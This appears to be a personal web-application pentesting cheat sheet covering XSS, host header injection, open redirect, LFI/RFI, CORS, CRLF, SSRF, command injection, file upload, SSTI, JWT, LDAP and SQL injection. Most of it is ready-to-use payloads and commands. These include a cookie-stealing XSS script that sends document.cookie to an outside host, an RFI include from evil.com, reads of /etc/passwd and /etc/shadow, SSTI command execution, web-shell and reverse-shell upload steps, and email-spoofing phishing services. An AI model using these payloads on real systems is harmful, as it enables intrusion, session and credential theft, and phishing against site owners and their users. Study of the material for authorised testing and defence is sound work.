![Alt text](https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true)

# XSS and Web Security Notes

## Enta pirikodivi evannni niku eandhuku ra

Make life easier, not harder.
You have to take the first step; then people follow.

[PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Application version-related exploits
Search in [exploit-db](https://www.exploit-db.com/)

## Addons

- Hackbar
- FoxyProxy Standard
- Wappalyzer
- Cookies Manager+
- SQL Inject Me
- XSS Me
- Tamper Data
- SecurityFocus Vulnerabilities search plugin
- Packet Storm search plugin
- Offsec Exploit-db Search

## Vulnerability Categories

- XSS
- Host Header Injection
- URL Redirection
- Parameter Tampering
- HTML Injection
- File Inclusion
- SPF Record Misconfiguration
- Insecure CORs Configuration
- SSRF
- Critical File Disclosure
- Source Code Disclosure
- CSRF
- Subdomain Takeover
- SQL Injection
- Command Injection
- File Upload Vulnerabilities
- XML Injection

## cURL to Burp Request Command
```bash
curl -x 127.0.0.1:8080
```

## XSS Payload Example
```html
%3cscript%3ealert%281%29%3c%2fscript%3e
```

---

# Vulnerability, Impact, and Solution

## 1. Information Gathering

- Learn the terminology and gather information about the server, frameworks, and default credentials.
- Identify previous vulnerabilities related to the application.

### Injection Points

- Where vulnerabilities can exist.
- The location of injection vulnerabilities (parameters).

### Information Flow

1. Site
2. Subdomains
3. Select unpopular websites
4. Find IP Address
5. Identify programming language
6. Open ports and services
7. Responsible disclosure ([eur.nl](https://eur.nl))

### Tools for Finding Subdomains

- [VirusTotal](https://www.virustotal.com/gui/home/search)
- [Subbrute](https://github.com/TheRook/subbrute)
  ```bash
  ./subbrute.py -c 50 example.com > example.com
  ```
- [Altdns](https://github.com/infosec-au/altdns)
- [Netcraft](https://searchdns.netcraft.com/)
- [HTTP Status Checker](https://httpstatus.io/)

### Finding IP Address & Open Ports

- Use `ping` or `nmap` for aggressive scanning, OS detection, and vulnerability scanning.

### Server Information & Banner Grabbing

```bash
whatweb domain.name
nikto -h domain.name
nc domain.name 80
```

---

# 2. Burp Suite Certificate Configuration

### Steps to Configure Burp Suite
1. Open `http://burp`.
2. Download CA Certificate.
3. Go to Browser > Preferences > Certificates > View Certificate > Import > Trust all certificates.

---

# 3. Cross-Site Scripting (XSS)

## XSS Background

**Impact of XSS:**
- Cookie theft
- Keylogging
- Phishing
- URL Redirection
- Site defacement

### Common XSS Injection Points

- Comment boxes
- Forums
- Signup/Login pages
- Search bars
- Registration forms
- Feedback forms
- Contact us forms

### How to Hunt for XSS

1. Find an input parameter and provide input.
2. If input reflects or is stored, there may be XSS.
3. Try executing JavaScript.

### XSS Payloads

```html
"><script>alert(1)</script>
"><svg/onload=alert(1)>
```

### White Characters Identifying XSS

- Special characters: `' " < > / // ( ) ^ script img svg div alert prompt`
- Event Handlers:
  ```html
  <div onpointerover="alert(45)">MOVE HERE</div>
  <div onpointerdown="alert(45)">MOVE HERE</div>
  ```

### Bypassing XSS Filters

- UTF-8 Encoding
- Unicode Encoding
- HTML Encoding
- Octal Encoding
- Common WAF Bypass

### Cloudflare XSS Bypass

```html
<svg/OnLoad="`${prompt``}`">
<svg/onload=alert`bohdan`>
```

### Practical XSS Exercises

- [Prompt.ml](https://prompt.ml/0)
- [XSS Lab](http://leettime.net/xsslab1/)

---

# 4. Manual XSS Vector Building

## Steps to Find & Exploit XSS

1. Find an input field that reflects input.
2. Check response in **view-source**.
3. Close any open tags.
4. Use event handlers like `onmouseover` for bypassing sanitization.

Example:
```html
<input type="text" name="name" value='hello'>
<input type="submit" name="submit" value="search">
```
Payload:
```html
'onmouseover='alert(1);
```

---

# References

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [LeetTime XSS Labs](http://leettime.net/xsslab1/)
- [Prompt.ml](https://prompt.ml/)

---
# XSS & Host Header Injection Testing Guide

## 1. First SDIPER Application
- Sort out the parameters.
- Check one by one → Send to repeater → Use payloads (`hello1`, `hello2`).
- If `hello2` is reflecting, try scripts or brute-force attacks.
- Sort the maximum length of the first 10 results, then show the response in the browser.

### Payload Naming:
- Use `xss.txt` for payloads or manually set a payload.
- Manual testing is better for stored XSS vulnerabilities.

## 2. Brute-Force Attack Considerations
- If you want to stop URL encoding, go for payload encoding.
- Uncheck URL encoding for better results.

## 3. XSS Through Header Injection
- Capture the request using **Burp Suite**.
- Add a `Referer` field below the `Host` in the header.
- Send it to the repeater:
  ```
  Host: abc.com
  Referer: hello
  ```
- If `hello` is reflecting, use the following payload:
  ```html
  <script>alert(1)</script>
  ```

## 4. URL Redirection
- Instead of `alert(1)`, use URL redirection.
- If it redirects to `bing.com`, it is vulnerable.
  ```html
  <script>document.location.href="http://bing.com"</script>
  ```
  Example vulnerable URL:
  ```
  http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=<script>document.location.href="http://bing.com"</script>
  ```

## 5. Phishing via XSS
- Instead of `alert(1)`, use an iframe:
  ```html
  <iframe src="http://bing.com" height="100%" width="100%"></iframe>
  ```

## 6. Cookie Stealing via XSS
- Victim's website transfers cookies to the attacker's site:
  ```html
  <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
  ```

## 7. XSS Through File Uploading
### Method 1:
- The `file_name` parameter is reflecting in the **view-source** (e.g., `abc.jpeg`).
- Attack by injecting scripts into the filename.
- Use **Intruder** with common payloads.

### Method 2:
- Upload a file containing an XSS script.
- Access the file to trigger the payload.

## 8. XSS Through RFI Vulnerability
- If an application has RFI vulnerability, host an XSS script on the attacker's server:
  ```
  http://10.10.11.24/xss.html  # Contains XSS payload
  ```
- Execute via a vulnerable endpoint:
  ```
  http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html
  ```

## 9. Self-XSS to Reflected XSS
- Copy the vulnerable **HTML response** from Burp Suite.
- Save it as an HTML file and open it in Firefox.
- Instead of `alert(1)`, use:
  ```html
  document.location.href="http://bing.com"
  ```
- Example:
  ```
  /@213dewf it is reflecting in browser → add XSS script:
  /@213dewf"><script>alert(1)</script>
  ```

## 10. Blind XSS Vulnerability
- Use **Hunter** for detection.

---

# Host Header Injection
## 1. Overview
- Exploiting host header injection in **virtual hosting environments**.
- Can lead to **web cache poisoning, XSS, password reset poisoning, and internal host access**.

## 2. Attack Methods
### Method 1:
```http
Host: bing.com
```
### Method 2:
```http
Host: bing.com
X-Forwarded-Host: realweb.com
```
### Method 3:
```http
Host: realweb.com
X-Forwarded-Host: bing.com
```
### Method 4:
```http
Referer: https://www.bing.com/
```

## 3. Host Header Injection with Web Cache Poisoning
- Follow the above methods.
- Click anywhere on the web application.
- If redirected to `bing.com`, the site is vulnerable.

## 4. Password Reset Poisoning
- Obtain a **password reset link**.
- Modify the `Host` header.

## 5. Host Header Attack for XSS
- Check if the response contains:
  ```html
  https://bing.com/?locald">
  ```
- Use the payload:
  ```html
  Host: bing.com"><script>alert(1)</script>
  ```

## 6. Host Header Injection on Referer Header
- Modify headers:
  ```http
  Connection: close
  Referer: https://www.bing.com/
  ```

## 7. Subdomain-Based Host Header Injection
- Use existing and non-existing subdomains to inject headers.

## 8. Advanced Host Header Attacks
### Internal Host Access:
```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

---

## Summary
This guide provides a structured approach to performing **XSS** and **Host Header Injection** attacks for security testing. Make sure to test responsibly and only on applications you have permission to test.

---
# 4. URL Redirection (Used as a Phishing Attack) or Open Redirection

## HTTP Status Code: 3xx, 200

### Common Parameters List:
```
dest,redirect,?,something is redirect to page
uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,validate,domain,callback,return,page,feed,host,port,next,data,reference,site,html,u=
```

### Payload Examples:
```
/{payload}
?next={payload}
?url={payload}
?target={payload}
?rurl={payload}
?dest={payload}
?destination={payload}
?redir={payload}
?redirect_uri={payload}
?redirect_url={payload}
?redirect={payload}
/redirect/{payload}
/cgi-bin/redirect.cgi?{payload}
/out/{payload}
/out?{payload}
?view={payload}
/login?to={payload}
?image_url={payload}
?go={payload}
?return={payload}
?returnTo={payload}
?return_to={payload}
?checkout_url={payload}
?continue={payload}
?return_path={payload}
```

### Approach:
1. **URL Redirection on Path Fragments:**
   ```
   example: any.com/payloads
   any.com/bing.com
   any.com//bing.com
   any.com//bing.com/%2e%2e
   ```
   Use the payload to attempt a brute-force attack.

2. **Sort the Parameters Returning a 200 Response:**
   ```
   GET /url=https://bing.com/
   ```

### Bypassing Techniques:
- Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
- Using `//` to bypass `http` blacklisted keyword: `//google.com`
- Using `https:` to bypass `//` blacklisted keyword: `https:google.com`
- Using `%E3%80%82` to bypass `.` blacklisted character: `//google%E3%80%82com`
- Using parameter pollution: `?next=whitelisted.com&next=google.com`
- Using `@` character: `http://www.theirsite.com@yoursite.com/`

**More payloads and techniques:** [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)

---

# 5. Parameter Tampering (All Parameters Change)

**Description:** The Web Parameter Tampering attack manipulates parameters exchanged between client and server to modify application data such as user credentials, permissions, prices, and product quantities.

**Targeted Parameters:**
```
price, amount, cost, discount, quantity, transaction, user IDs, number, strings, delivery charges, etc.
```

### Attack Scenarios:
#### Example 1:
```
Qty=500&price=100  →  Qty=5&price=100
```
#### Example 2:
```
Cashback=0&amt=100&qty=1 → Cashback=100000&amt=100&qty=1
```
#### Example 3:
Modify the request in Burp Suite before the payment gateway.

### Bypass Methods:
1. Encode and decode the URL to change the amount.
2. Modify cookies in the browser storage.
3. Upload a malicious profile picture with a link.

---

# 6. HTML Injection

**Description:** HTML injection occurs when an attacker can inject arbitrary HTML code into a vulnerable web page.

### Payloads:
```html
<h1>Vulnerable for HTML Injection</h1>
<A HREF="http://bing.com/">OffensiveHunter</A>
```

**DOM HTML Injection Example:**
```html
<script>
function setMessage(){
 var t=location.hash.slice(1);
 document.getElementById(t).innerText = "The DOM is now loaded and can be manipulated.";
}
window.onload = setMessage;
</script>
<a href="#message"> Show Here</a>
<div id="message">Showing Message</div>
```

---

# 7. Local File Inclusion (LFI) and Remote File Inclusion (RFI)

### **Impact of File Inclusion:**
1. Code execution on the server
2. Code execution on the client side
3. Denial of Service (DoS) attacks
4. Information disclosure (passwords, usernames, system files)

### **Common LFI Parameters:**
```
file, document, folder, root, path, pg, style, pdf, template, php_path, doc, content, static
```

### **Basic LFI Exploitation:**
```bash
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../etc/shadow
```

### **Basic RFI Exploitation:**
```bash
http://example.com/index.php?page=http://evil.com/shell.txt
```

### **LFI/RFI Bypass Techniques:**
- **Null byte injection:** `page=../../../etc/passwd%00`
- **Double encoding:** `page=%252e%252e%252fetc%252fpasswd`
- **PHP wrappers:** `php://filter/convert.base64-encode/resource=index.php`

**Tools:**
- [Kadimus](https://github.com/P0cL4bs/Kadimus)
- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [fimap](https://github.com/kurobeats/fimap)

---

# 10. Missing or Insufficient SPF Record

**Description:** If a domain lacks an SPF record, attackers can send phishing emails that appear legitimate.

### **Tools:**
- [MXToolbox](https://mxtoolbox.com/)
- [SPF Validator](https://www.kitterman.com/spf/validate.html)

### **Exploitation Example:**
```text
From: support@hubspot.net
To: victim@gmail.com
Subject: Email Forgery due to missing SPF
```

**Phishing Tools:**
- [Emkei.cz](https://emkei.cz/)
- [Anonymous Email](https://anonymousemail.me/)
- [5YMail](https://www.5ymail.com/)

---
# CORS (Cross-Origin Resource Sharing) Security Testing Guide

## 1. Testing CORS Misconfigurations

### Steps to Check CORS Vulnerability:
1. Add an `Origin` header.
2. Set headers as:
   ```
   Origin: http://bing.com
   Pragma: no-cache
   Referer: https://bing.com/
   ```
3. Try `Origin: null`.
4. Check for internal applications (same-site origin).

### Insecure Configurations Detection (Response Headers):
```bash
curl -s --head 'http://api.view.yahoo.com/api/session/preferences'
curl -s --head 'http://api.view.yahoo.com/api/session/preferences' -H 'origin: http://view.yahoo.com'
```

**Vulnerable Headers:**
```
Access-Control-Allow-Origin: http://www.evil.com
Access-Control-Allow-Origin: *
```
- `*` means it is allowing all domains (vulnerable setup).

### Exploitation:
- Look for `embed` parameters in URLs (`embed?url=`).
- Modify `Origin`, `Pragma`, and `Referer` headers:
   ```
   Host: hackerseera.com
   Origin: http://bing.com
   Pragma: no-cache
   Referer: https://bing.com/
   ```
- If response shows `Access-Control-Allow-Origin: http://bing.com`, the site is vulnerable.
- Also, try `Origin: null`.

### Poorly Implemented CORS:
```bash
Access-Control-Allow-Origin: https://anysite.com
Access-Control-Allow-Credentials: true
```
- If `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true`, it's misconfigured but not always exploitable.

### Exploit with Curl:
```bash
curl http://any.com -H "Origin: http://www.bing.com" -I
```

## 2. CRLF Injection

### Exploitation Examples:
#### Add a Cookie:
```
http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue
```
#### Bypass XSS Protection:
```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a<svg onload=alert(document.domain)>
```
#### Write HTML Response:
```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```

## 3. Server-Side Request Forgery (SSRF)

### Exploitation Techniques:
1. Abuse trust:
   ```
   any.com/index/php?uri=http://external.com
   ```
2. Bypass IP whitelisting:
   ```
   any.com/index/php?uri=file:/etc/passwd
   ```
3. Scan internal networks:
   ```
   any.com/index/php?uri=http://localhost:1
   ```
4. Cloud metadata extraction:
   ```
   http://169.254.169.254/latest/meta-data/
   ```

### Testing with Burp Collaborator:
1. Open Burp Collaborator.
2. Set interaction poll.
3. Inject payload in a vulnerable parameter:
   ```
   /showimage.php?file=http://burp-collaborator-url
   ```
4. Check logs in Burp for external requests.

## 4. Critical Files Exposure

### Impact:
- Exposure of sensitive files like `database credentials`, `server authentication data`, or `business logic information`.

### Scanning:
```bash
dirb http://target.com/ wordlist.txt
gobuster dir -u http://target.com/ -w wordlist.txt
```

## 5. Cross-Site Request Forgery (CSRF)

### Exploitation:
#### Logout CSRF:
```html
<img src="http://target.com/logout.php">
```
#### Account Takeover CSRF:
1. Capture a profile update request.
2. Change `email` field in CSRF PoC.
3. Open PoC in browser and submit.

## 6. Two-Factor Authentication (2FA) Bypass

### Exploitation:
- Login to an account where 2FA is implemented.
- Try directly accessing resources after authentication without entering OTP.

## 7. Hostile Subdomain Takeover

### Attack Scenario:
1. Find subdomains that point to inactive services.
2. Register on the third-party service and claim the subdomain.
3. Set up phishing attacks on the hijacked subdomain.

### Scanning for Takeovers:
```bash
ruby sub_brust.rb --fast nokia.com
```

## References:
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF)
- [CSRF Exploits](https://github.com/qazbnm456/awesome-web-security/blob/master/README.md#csrf---cross-site-request-forgery)

---
# Security Testing Techniques

## 13. Command Injection

### Tool:
- [Commix](https://github.com/commixproject/commix)

### Identification:
Find an input field that interacts with the operating system shell. Try executing system shell commands using delimiters.

**Example:**
```bash
ping -c 5 127.0.0.1
```

**Possible Parameters:**
`filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=`

**Example:**
```bash
;ls &&ls ||ls
```

### Bypass Methods:
```bash
;^& && | || %0D %0A \n <
```

### Brute-force:
- Use a payload list of commands (`cmd.txt`).
- Use a delimiter list (`delimeter_list`).
- Cluster bomb attack: Combines different delimiters with parameters sequentially.

**Setting Payload in Injection Point:**
```bash
filename=$delimeter.txt$$cmd.txt$
```

**Burp Suite Intruder:**
- Use the cluster bomb attack type.
- Set two payloads to generate combinations of attacks.

### Exploitation Tool:
```bash
python commix.py -u <url>
```

### Chaining Commands:
```bash
original_cmd_by_server; ls
original_cmd_by_server && ls
original_cmd_by_server | ls
original_cmd_by_server || ls  # Only if the first command fails
```

### Inside a Command:
```bash
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```

### Bypass Techniques:
```bash
w'h'o'am'i  # Single quotes bypass
w"h"o"am"i  # Double quotes bypass
w\ho\am\i  # Backslash bypass
/\b\i\n/////s\h  # Slash bypass
who$@ami  # Using $@
echo $0   # Identifying shell
```

---

## 14. File Uploading

### Tools:
- [Fuxploider](https://github.com/almandin/fuxploider)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

### Methods:
1. **Simple File Upload**
   - Upload `c99.php` or `dhanush.php` for execution.
   - Use `nc.exe` for a reverse shell (Windows).
2. **Content-Type Bypass**
   - Modify the `Content-Type` header in Burp Suite.
   - Example: Change `text/php` to `image/jpeg`.
3. **Extension Verification Bypass**
   - Use double extensions (`shell.php.jpg`).

### Tool:
- [FuzzDB Malicious Images](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/file-upload/malicious-images)

---

## 15. XML External Entity (XXE) Injection

### Payload:
```xml
<foo><text>Xml testing</text></foo>
```

### Exploitation:
- Use `Burp Suite Intruder` to automate attacks.
- Use `xml-attacks` payloads.

---

## Web Cache Deception Attack

### Steps:
1. Browse normally: `https://www.example.com/myaccount/home/`
2. Open malicious link: `https://www.example.com/myaccount/home/malicious.css`
3. The cache saves the page.
4. Open in a private tab: `https://www.paypal.com/myaccount/home/malicious.css`

### Cache Poisoning Headers:
- `X-Forwarded-Host`
- `X-Host`
- `X-Forwarded-Scheme`
- `X-Original-URL`
- `X-Rewrite-URL`

### Example Attack:
```http
GET /test?buster=123 HTTP/1.1
Host: target.com
X-Forwarded-Host: test"><script>alert(1)</script>
```

---

## Insecure Direct Object References (IDOR)

### Tools:
- Burp Suite Plugins: `Authz`, `AuthMatrix`, `Authorize`

### Example Parameters:
- `http://foo.bar/somepage?invoice=12345`
- `http://foo.bar/changepassword?user=someuser`
- `http://foo.bar/showImage?img=img00011`

---

## XPATH Injection

### Example Payloads:
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
```

### Blind Exploitation:
```xpath
and string-length(account)=SIZE_INT
```

### Tools:
- [xcat](https://github.com/orf/xcat)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

---

## XSLT Injection

### Description:
Processing an unvalidated XSL stylesheet can allow an attacker to change XML structure, include arbitrary files, or execute commands.

### Tools:
- [PayloadsAllTheThings - XSLT Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#tools)

---

## Template Injection (SSTI)

### Tools:
- [Tplmap](https://github.com/epinna/tplmap)

### Basic Injections:
#### ERB Engine:
```erb
<%= 7 * 7 %>
<%= File.open('/etc/passwd').read %>
<%= system('cat /etc/passwd') %>
```

#### Java:
```java
${7*7}
${class.getClassLoader()}
${T(java.lang.System).getenv()}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
```

#### Twig:
```twig
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

---
# JSON Web Token (JWT) Exploitation & SQL Injection Techniques

## JWT - JSON Web Token
JSON Web Token follows the format:
```
Base64(Header).Base64(Data).Base64(Signature)
```
### Example
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```
JWT is split into three parts:
- **Header**: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`
- **Payload**: `eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ`
- **Signature**: `UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY`

Default algorithm: **HS256** (HMAC SHA256 symmetric encryption). For asymmetric purposes, **RS256** is used.

#### Header Example
```json
{
    "typ": "JWT",
    "alg": "HS256"
}
```
#### Payload Example
```json
{
    "sub":"1234567890",
    "name":"Amazing Haxx0r",
    "exp":"1466270722",
    "admin":true
}
```
### Exploiting JWT Vulnerabilities
#### Modify JWT Signature to None Algorithm
```python
import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.YWUyMGU4YTI2ZGEyZTQ1MzYzOWRkMjI5YzIyZmZhZWM0NmRlMWVhNTM3NTQwYWY2MGU5ZGMwNjBmMmU1ODQ3OQ'

# Decode the token
decodedToken = jwt.decode(jwtToken, verify=False)
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())
```
#### Output:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
```
#### Brute-force JWT Secret Key
```sh
git clone https://github.com/ticarpi/jwt_tool
python2.7 jwt_tool.py <JWT_TOKEN> /tmp/wordlist
```
Reference: [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)

---

## LDAP Injection
LDAP Injection exploits applications that construct LDAP queries based on user input.

### Basic Injection Example
```sh
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
```
### Common LDAP Payloads
```sh
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```
---

## OAuth Exploitation
- Stealing OAuth Token via Referer
- Grabbing OAuth Token via `redirect_uri`
- Executing XSS via `redirect_uri`
- OAuth Private Key Disclosure
- Authorization Code Rule Violation
- Cross-Site Request Forgery (CSRF)

Reference: [PayloadsAllTheThings - OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)

---

## SQL Injection (SQLi)
SQL Injection can be:
- GET Based
- POST Based
- Header Based
- Cookie Based

### SQL Injection Detection Payloads
```sh
'
%27
"
%22
#
%23
;
%3B
)
%25%27
/
%3B
```
#### Logical Testing
```sh
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
#### WAF Bypass Techniques
```sh
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%A0and%A01=1%A0--
```
#### Alternative Operators
```sh
AND   -> &&
OR    -> ||
=     -> LIKE, REGEXP, BETWEEN
```

### Blind SQL Injection (Boolean-Based)
```sh
?id=1' and 1=1 --+  # True
?id=1' and 1=2 --+  # False
```
#### Extract Database Name
```sh
?id=1' and substring(database(),1,1)="a" --+
```
### Time-Based SQL Injection
```sh
?id=1' and sleep(10) --+
```
### SQLMap Usage
```sh
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -D target_db --tables
```
---

## Tools for Exploitation
- [Hackbar](https://code.google.com/archive/p/hackbar/downloads)
- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [JWT Tool](https://github.com/ticarpi/jwt_tool)

Reference Video: [SQL Injection Exploitation](https://www.youtube.com/watch?v=vWoZK8UM6js)

---




